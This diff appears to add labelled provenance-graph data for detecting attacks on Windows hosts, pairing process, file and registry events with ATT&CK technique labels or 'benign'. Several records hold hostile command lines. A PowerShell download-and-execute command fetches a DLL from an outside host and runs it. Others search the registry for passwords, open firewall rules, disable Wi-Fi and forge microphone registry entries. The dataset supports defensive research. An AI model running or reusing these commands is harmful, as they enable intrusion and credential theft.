+        "Cmdline": "24f089cd7b8348eea7f18b3d69fe7bd4d000f1a4c2ba7889a5e133e9862cc1e2",
+        "Pid": 12784,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "1b170e57-9be3-55b1-8d2d-df8fb3645ece",
+        "Name": "C:\\Windows\\Temp\\HighPerformancePlan.log",
+        "Type": "File"
+    },
+    "relation": "WriteFile",
+    "timestamp": 1655177244,
+    "label": "T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4"
+}
+{
+    "srcNode": {
+        "UUID": "c8f0fe15-dff4-50e4-8bb8-74cd40980949",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "\"C:\\Windows\\system32\\cmd.exe\" /c \"netstat -ano\"",
+        "Type": "Process",
+        "Pid": 10716
+    },
+    "dstNode": {
+        "UUID": "5ebdc0df-c77b-53ee-9589-8a745b827198",
+        "Name": "NETSTAT.EXE",
+        "Image": "C:\\Windows\\system32\\NETSTAT.EXE",
+        "Cmdline": "netstat  -ano",
+        "Type": "Process",
+        "Pid": 8200
+    },
+    "relation": "Process Create",
+    "timestamp": 1655177246,
+    "label": "T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4"
+}
+{
+    "srcNode": {
+        "UUID": "4f2a2403-2753-5f99-814a-0f0c3804c38b",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"(New-Object Net.WebClient).DownloadString('http://colchonesmanzur.com/GjVgBnKaNIC/KHMMGS5zJ300PjoPEX0KBSsaHAkAJBgGOkJ7cn5henxzYn1le34=') | Out-File \\\"sEr7OgQnRteMfaUPZ.dll\\\"; Invoke-Item \\\"sEr7OgQnRteMfaUPZ.dll\\\"\"",
+        "Pid": 3760,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "5a1c7cd4-5274-5705-81d4-b8719f2833b9",
+        "Name": "netsh.exe",
+        "Image": "C:\\Windows\\system32\\netsh.exe",
+        "Cmdline": "netsh  advfirewall firewall set rule group=\"file and printer sharing\" new enable=Yes",
+        "Type": "Process",
+        "Pid": 6616
+    },
+    "relation": "Process Create",
+    "timestamp": 1655245575,
+    "label": "T1562.004_280003641a5cddf916c4f2bf605a71d3"
+}
+{
+    "srcNode": {
+        "UUID": "4f2a2403-2753-5f99-814a-0f0c3804c38b",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"(New-Object Net.WebClient).DownloadString('http://colchonesmanzur.com/GjVgBnKaNIC/KHMMGS5zJ300PjoPEX0KBSsaHAkAJBgGOkJ7cn5henxzYn1le34=') | Out-File \\\"sEr7OgQnRteMfaUPZ.dll\\\"; Invoke-Item \\\"sEr7OgQnRteMfaUPZ.dll\\\"\"",
+        "Pid": 3760,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "010061af-5279-5371-a3e3-80e399b69cd4",
+        "Name": "net.exe",
+        "Image": "C:\\Windows\\system32\\net.exe",
+        "Cmdline": "\"C:\\Windows\\system32\\net.exe\" view \\\\web-11.hardy-morris.info /all",
+        "Type": "Process",
+        "Pid": 8964
+    },
+    "relation": "Process Create",
+    "timestamp": 1655245575,
+    "label": "T1135_deeac480-5c2a-42b5-90bb-41675ee53c7e"
+}
+{
+    "srcNode": {
+        "UUID": "4f2a2403-2753-5f99-814a-0f0c3804c38b",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"(New-Object Net.WebClient).DownloadString('http://colchonesmanzur.com/GjVgBnKaNIC/KHMMGS5zJ300PjoPEX0KBSsaHAkAJBgGOkJ7cn5henxzYn1le34=') | Out-File \\\"sEr7OgQnRteMfaUPZ.dll\\\"; Invoke-Item \\\"sEr7OgQnRteMfaUPZ.dll\\\"\"",
+        "Pid": 3760,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "ef6f422b-3dc5-58e8-a5ad-2cfad386c6fa",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg query HKLM /f password /t REG_SZ /s",
+        "Type": "Process",
+        "Pid": 10372
+    },
+    "relation": "Process Create",
+    "timestamp": 1655245575,
+    "label": "T1552.002_3e5b04b8ee0a1a4950da8f35d95e65fc"
+}
+{
+    "srcNode": {
+        "UUID": "4f2a2403-2753-5f99-814a-0f0c3804c38b",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt; $Space,$Heading,$Break,$Data = Get-Content C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt; @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \\\"\\\" } |Set-Content C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt\"",
+        "Pid": 3760,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "34b170e6-5d6e-569e-832f-43f015d3ef28",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt; $Space,$Heading,$Break,$Data = Get-Content C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt; @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \\\"\\\" } |Set-Content C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt\"",
+        "Type": "Process",
+        "Pid": 11228
+    },
+    "relation": "Process Create",
+    "timestamp": 1655245575,
+    "label": "T1120_7b9c7afaefa59aab759b49af0d699ac1"
+}
+{
+    "srcNode": {
+        "UUID": "34b170e6-5d6e-569e-832f-43f015d3ef28",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt; $Space,$Heading,$Break,$Data = Get-Content C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt; @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \\\"\\\" } |Set-Content C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt\"",
+        "Type": "Process",
+        "Pid": 11228
+    },
+    "dstNode": {
+        "UUID": "3c99cb6c-1238-5a4e-84ac-9c7966f58e20",
+        "Name": "C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt",
+        "Type": "File"
+    },
+    "relation": "WriteFile",
+    "timestamp": 1655245577,
+    "label": "T1120_7b9c7afaefa59aab759b49af0d699ac1"
+}
+{
+    "srcNode": {
+        "UUID": "34b170e6-5d6e-569e-832f-43f015d3ef28",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt; $Space,$Heading,$Break,$Data = Get-Content C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt; @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \\\"\\\" } |Set-Content C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt\"",
+        "Type": "Process",
+        "Pid": 11228
+    },
+    "dstNode": {
+        "UUID": "3c99cb6c-1238-5a4e-84ac-9c7966f58e20",
+        "Name": "C:\\ProgramData\\USOEnable\\Lib\\site-packages\\pyark\\HDD\\msg_41.txt",
+        "Type": "File"
+    },
+    "relation": "ReadFile",
+    "timestamp": 1655245577,
+    "label": "T1120_7b9c7afaefa59aab759b49af0d699ac1"
+}
+{
+    "srcNode": {
+        "UUID": "4f2a2403-2753-5f99-814a-0f0c3804c38b",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"(New-Object Net.WebClient).DownloadString('http://colchonesmanzur.com/GjVgBnKaNIC/KHMMGS5zJ300PjoPEX0KBSsaHAkAJBgGOkJ7cn5henxzYn1le34=') | Out-File \\\"sEr7OgQnRteMfaUPZ.dll\\\"; Invoke-Item \\\"sEr7OgQnRteMfaUPZ.dll\\\"\"",
+        "Pid": 3760,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "211974f3-661f-53fa-8b59-e72308c28f56",
+        "Name": "netsh.exe",
+        "Image": "C:\\Windows\\system32\\netsh.exe",
+        "Cmdline": "\"C:\\Windows\\system32\\netsh.exe\" interface set interface name=Wi-Fi admin=DISABLED",
+        "Type": "Process",
+        "Pid": 8260
+    },
+    "relation": "Process Create",
+    "timestamp": 1655245578,
+    "label": "T1499_2fe2d5e6-7b06-4fc0-bf71-6966a1226731"
+}
+{
+    "srcNode": {
+        "UUID": "170345b5-64cf-579c-8fc9-e4ee86eb6ba0",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 11006,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "d32e65b8-afeb-5585-b7eb-d1be1dd69bbf",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\0WQR33LZFJ.tmp /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\0WQR33LZFJ.tmp /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f",
+        "Type": "Process",
+        "Pid": 10016
+    },
+    "relation": "Process Create",
+    "timestamp": 1655194477,
+    "label": "T1123_372e6f46fca18e4f1b43209c20ffafa2"
+}
+{
+    "srcNode": {
+        "UUID": "1b3d5cbf-7cde-5652-93fc-bd3d09f703e7",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\0WQR33LZFJ.tmp /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f ",
+        "Type": "Process",
+        "Pid": 7352
+    },
+    "dstNode": {
+        "UUID": "92d01c5b-17c9-5655-8984-c89c1a78984a",
+        "Key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\0WQR33LZFJ.tmp\\LastUsedTimeStart",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655194480,
+    "label": "T1123_372e6f46fca18e4f1b43209c20ffafa2"
+}
+{
+    "srcNode": {
+        "UUID": "c2db49dd-8485-5620-820c-e3f86fd63457",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\0WQR33LZFJ.tmp /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f",
+        "Type": "Process",
+        "Pid": 10396
+    },
+    "dstNode": {
+        "UUID": "0488f98c-4d82-5200-8d1d-c1c876ceabe0",
+        "Key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\0WQR33LZFJ.tmp\\LastUsedTimeStop",
+        "Type": "Registry",
+        "Value": "96 EF 51 4B 72 04 D6 01"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655194483,
+    "label": "T1123_372e6f46fca18e4f1b43209c20ffafa2"
+}
+{
+    "srcNode": {
+        "UUID": "6376ef5f-def3-56d4-a64a-dc585d30ea4a",
+        "Name": "SearchFilterHost.exe",
+        "Image": "C:\\Windows\\system32\\SearchFilterHost.exe",
+        "Cmdline": "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 812 816 824 8192 820 792 ",
+        "Type": "Process",
+        "Pid": 7736
+    },
+    "dstNode": {
+        "UUID": "0e488a06-f2ee-5cd5-84b5-6f96ce6cd685",
+        "Key": "HKCR",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryKey",
+    "timestamp": 1655179745,
+    "label": "benign"
+}
+{
+    "srcNode": {
+        "UUID": "6376ef5f-def3-56d4-a64a-dc585d30ea4a",
+        "Name": "SearchFilterHost.exe",
+        "Image": "C:\\Windows\\system32\\SearchFilterHost.exe",
+        "Cmdline": "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 812 816 824 8192 820 792 ",
+        "Type": "Process",
+        "Pid": 7736
+    },
+    "dstNode": {
+        "UUID": "93579d06-e6e8-5e94-b78d-757ba5eb5110",
+        "Name": "C:\\Windows\\ehome\\ehTrace.dll",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655179745,
+    "label": "benign"
+}
+{
+    "srcNode": {
+        "UUID": "2ad37587-fc6f-504f-801a-828663695ec9",
+        "Name": "svchost.exe",
+        "Image": "C:\\Windows\\system32\\svchost.exe",
+        "Cmdline": "C:\\Windows\\system32\\svchost.exe -k LocalServiceAndNoImpersonation -p -s SSDPSRV",
+        "Type": "Process",
+        "Pid": 3888
+    },
+    "dstNode": {
+        "UUID": "62ce5254-c36b-56f0-8598-f53d6c2eff7d",
+        "Srcaddress": "239.255.255.250",
+        "Dstaddress": "192.168.48.1:49432",
+        "Port": "ssdp",
+        "Type": "Network"
+    },
+    "relation": "UDP Receive",
+    "timestamp": 1655179785,
+    "label": "benign"
+}
+{
+    "srcNode": {
+        "UUID": "40d024dd-3ee5-52f2-b26e-2b60f7cf4179",
+        "Name": "svchost.exe",
+        "Image": "C:\\Windows\\system32\\svchost.exe",
+        "Cmdline": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
+        "Type": "Process",
+        "Pid": 836
+    },
+    "dstNode": {
+        "UUID": "78055506-6a3d-5f2c-acf8-042ea0e00c78",
+        "Name": "FileCoAuth.exe",
+        "Image": "C:\\Users\\ezk\\AppData\\Local\\Microsoft\\OneDrive\\22.099.0508.0001\\FileCoAuth.exe",
+        "Cmdline": "\"C:\\Users\\ezk\\AppData\\Local\\Microsoft\\OneDrive\\22.099.0508.0001\\FileCoAuth.exe\" -Embedding",
+        "Type": "Process",
+        "Pid": 7776
+    },
+    "relation": "Process Create",
+    "timestamp": 1655179813,
+    "label": "benign"
+}
